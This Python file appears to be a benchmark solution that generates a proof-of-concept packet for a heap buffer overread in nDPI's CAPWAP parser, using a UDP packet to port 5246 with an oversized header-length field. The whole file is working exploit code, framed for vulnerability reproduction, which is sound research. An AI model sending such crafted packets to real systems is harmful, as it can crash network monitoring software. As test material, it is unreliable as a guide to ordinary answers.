import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in ndpi_search_setup_capwap.
        The vulnerability (CVE-2020-15474 / OSS-Fuzz Issue 21000) is caused by a buffer overread 
        when the CAPWAP header length field (HLEN) indicates a size larger than the actual packet.
        
        Target Length: 33 bytes
        Structure: IPv4 Header (20 bytes) + UDP Header (8 bytes) + Payload (5 bytes)
        """
        
        # --- 1. IPv4 Header (20 bytes) ---
        # Ver: 4, IHL: 5, Total Len: 33, Proto: UDP (17), Src/Dst: 127.0.0.1
        ip_ver_ihl = 0x45
        ip_tos = 0x00
        ip_len = 33
        ip_id = 0x0001
        ip_frag = 0x0000
        ip_ttl = 0x40
        ip_proto = 0x11
        ip_check = 0x0000
        ip_src = 0x7F000001
        ip_dst = 0x7F000001
        
        header_fmt = '!BBHHHBBHII'
        # Pack with zero checksum initially
        ip_header_temp = struct.pack(header_fmt, 
                                     ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, 
                                     ip_ttl, ip_proto, ip_check, ip_src, ip_dst)
        
        # Calculate IP Checksum
        s = 0
        for i in range(0, len(ip_header_temp), 2):
            w = (ip_header_temp[i] << 8) + ip_header_temp[i+1]
            s += w
        while (s >> 16):
            s = (s & 0xFFFF) + (s >> 16)
        ip_check = ~s & 0xFFFF
        
        # Pack with valid checksum
        ip_header = struct.pack(header_fmt, 
                                ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, 
                                ip_ttl, ip_proto, ip_check, ip_src, ip_dst)
        
        # --- 2. UDP Header (8 bytes) ---
        # Src Port: Arbitrary
        # Dst Port: 5246 (CAPWAP Control) - ensures nDPI routes this to ndpi_search_setup_capwap
        # Length: 8 (header) + 5 (payload) = 13
        udp_header = struct.pack('!HHHH', 12345, 5246, 13, 0)
        
        # --- 3. Payload (5 bytes) ---
        # The CAPWAP header starts here.
        # Byte 0: Preamble (Version/Type)
        # Byte 1: HLEN (5 bits) | RID (3 bits)
        # Vulnerability trigger: Set HLEN to maximum (31 -> 0x1F). 
        # 0x1F << 3 = 0xF8.
        # This implies a header length of 31 * 4 = 124 bytes.
        # The parser reads offsets based on this length without checking if the packet is actually that long.
        # Since our payload is only 5 bytes, this causes a heap buffer overread.
        payload = b'\x00\xF8\x00\x00\x00'
        
        return ip_header + udp_header + payload